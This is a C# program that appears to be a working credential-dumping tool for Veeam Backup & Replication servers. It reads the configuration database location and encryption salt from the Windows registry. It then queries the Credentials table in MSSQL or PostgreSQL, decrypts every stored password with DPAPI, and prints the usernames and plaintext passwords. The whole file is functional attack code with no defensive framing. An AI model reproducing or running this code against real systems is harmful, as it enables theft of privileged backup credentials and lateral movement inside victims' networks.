using System;
using System.Data;
using Microsoft.Win32;
using System.Data.SqlClient;
using Npgsql;
using System.Security.Cryptography;
using System.Text;
using System.IO;

class Program
{
    static readonly string logPath = "app.log";

    static void Main()
    {
        try
        {
            string cfg = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations", "SqlActiveConfiguration");
            if (cfg == null)
            {
                Log("Ошибка конфигурации.");
                return;
            }

            string saltB64 = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup and Replication\Data", "EncryptionSalt");
            if (string.IsNullOrEmpty(saltB64))
            {
                Log("Ошибка соли.");
                return;
            }

            byte[] salt = Convert.FromBase64String(saltB64);
            if (cfg == "MsSql") HandleMsSql(salt);
            else if (cfg == "PostgreSql") HandlePgSql(salt);
        }
        catch (Exception ex) { Log($"Ошибка: {ex.Message}"); }
    }

    static void HandleMsSql(byte[] slt)
    {
        try
        {
            string srv = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlServerName");
            string ins = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlInstanceName");
            string db = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\MsSql", "SqlDatabaseName");

            string connStr = $"Server={srv}\\{ins};Database={db};Integrated Security=True;";
            string qry = "SELECT user_name, password, description, change_time_utc FROM [dbo].[Credentials]";

            using (var conn = new SqlConnection(connStr))
            {
                var cmd = new SqlCommand(qry, conn);
                var adp = new SqlDataAdapter(cmd);
                var ds = new DataSet();

                conn.Open();
                adp.Fill(ds);
                conn.Close();

                ProcData(ds, slt);
            }
        }
        catch (Exception ex) { Log($"Ошибка MsSql: {ex.Message}"); }
    }

    static void HandlePgSql(byte[] slt)
    {
        try
        {
            string srv = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlHostName");
            string prt = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlHostPort");
            string db = GetRegVal(RegistryHive.LocalMachine, @"SOFTWARE\Veeam\Veeam Backup Reporting\DatabaseConfigurations\PostgreSql", "SqlDatabaseName");

            string connStr = $"Host={srv};Port={prt};Database={db};Integrated Security=true;";
            string qry = "SELECT user_name, password, description, change_time_utc FROM credentials";

            using (var conn = new NpgsqlConnection(connStr))
            {
                var cmd = new NpgsqlCommand(qry, conn);
                var adp = new NpgsqlDataAdapter(cmd);
                var ds = new DataSet();

                conn.Open();
                adp.Fill(ds);
                conn.Close();

                ProcData(ds, slt);
            }
        }
        catch (Exception ex) { Log($"Ошибка PgSql: {ex.Message}"); }
    }

    static void ProcData(DataSet ds, byte[] slt)
    {
        foreach (DataTable tbl in ds.Tables)
        {
            foreach (DataRow rw in tbl.Rows)
            {
                string usr = rw["user_name"].ToString();
                string encPwd = rw["password"].ToString();
                string decPwd = Decrypt(encPwd, slt);

                string desc = rw["description"].ToString();
                string chgTime = rw["change_time_utc"].ToString();

                Console.WriteLine($"User: {usr}, Password: {decPwd}, Desc: {desc}, Change: {chgTime}");
            }
        }
    }

    static string Decrypt(string pwd, byte[] slt)
    {
        try
        {
            byte[] encPwd = Convert.FromBase64String(pwd);
            byte[] decPwd = ProtectedData.Unprotect(encPwd, slt, DataProtectionScope.LocalMachine);
            return Encoding.UTF8.GetString(decPwd);
        }
        catch (Exception ex)
        {
            Log($"Ошибка расшифровки: {ex.Message}");
            return "Ошибка";
        }
    }

    static string GetRegVal(RegistryHive hv, string key, string name)
    {
        try
        {
            using (var bKey = RegistryKey.OpenBaseKey(hv, RegistryView.Default))
            using (var sKey = bKey.OpenSubKey(key))
            {
                if (sKey != null) return sKey.GetValue(name)?.ToString();
                return null;
            }
        }
        catch (Exception ex)
        {
            Log($"Ошибка реестра: {ex.Message}");
            return null;
        }
    }

    static void Log(string msg)
    {
        try
        {
            File.AppendAllText(logPath, $"{DateTime.Now}: {msg}\n");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ошибка лога: {ex.Message}");
        }
    }
}
